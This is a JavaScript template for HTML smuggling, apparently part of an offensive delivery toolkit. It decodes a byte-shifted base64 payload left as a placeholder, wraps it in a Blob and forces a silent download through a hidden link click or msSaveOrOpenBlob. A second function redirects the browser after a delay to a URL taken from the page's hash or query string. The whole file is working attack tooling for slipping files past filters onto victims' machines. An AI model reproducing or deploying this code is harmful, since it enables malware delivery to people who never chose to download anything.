function obf_base64ToArrayBuffer(obf_base64) {
    var obf_binary_string = window.atob(obf_base64);
    var obf_len = obf_binary_string.length;
    
    var obf_bytes = new Uint8Array( obf_len );
        for (var i = 0; i < obf_len; i++) { obf_bytes[i] = (obf_binary_string.charCodeAt(i) + 35) % 256; }
        return obf_bytes.buffer;
}

function obf_launchHtmlSmuggling() {
    var obf_file = '<<<PAYLOAD>>>';
    var obf_data = obf_base64ToArrayBuffer(obf_file);
    var obf_blob = new Blob([obf_data], {type: '<<<MIME_TYPE>>>'});
    var obf_fileName = '<<<OUTPUT_FILENAME>>>';

    // msSaveOrOpenBlob
    if (window.navigator['msSaveOrOpenBlob']) {
        window.navigator['msSaveOrOpenBlob'](obf_blob, obf_fileName);
    } 
    else {
        var obf_a = document.createElement('a');
        document.body.appendChild(obf_a);
        obf_a.style = 'display: none';

        // createObjectURL
        var obf_url = window.URL['createObjectURL'](obf_blob);
        obf_a['href'] = obf_url;

        // download
        obf_a['download'] = obf_fileName;

        obf_a['click']();

        // revokeObjectURL
        window.URL['revokeObjectURL'](obf_url);
    }
}

function obf_redirect(obf_redurl, obf_param, obf_timeout) {
    var obf_url = "";

    if(obf_redurl == "hash") {
        var obf_matches = window.location.hash.match(new RegExp(obf_param+'=([^&]*)'));
        if (obf_matches) {
            obf_url = obf_matches[1];
        }
    }
    else if(obf_redurl == "get") {
        var obf_urlobj = new URL(window.location.href);
        obf_url = obf_urlobj.searchParams.get(obf_param);
    }
    else {
        obf_url = obf_redurl;
    }

    if (obf_url.length > 0) {
        setTimeout(function(){
            window.location.href = obf_url;
        }, obf_timeout);
    }
}
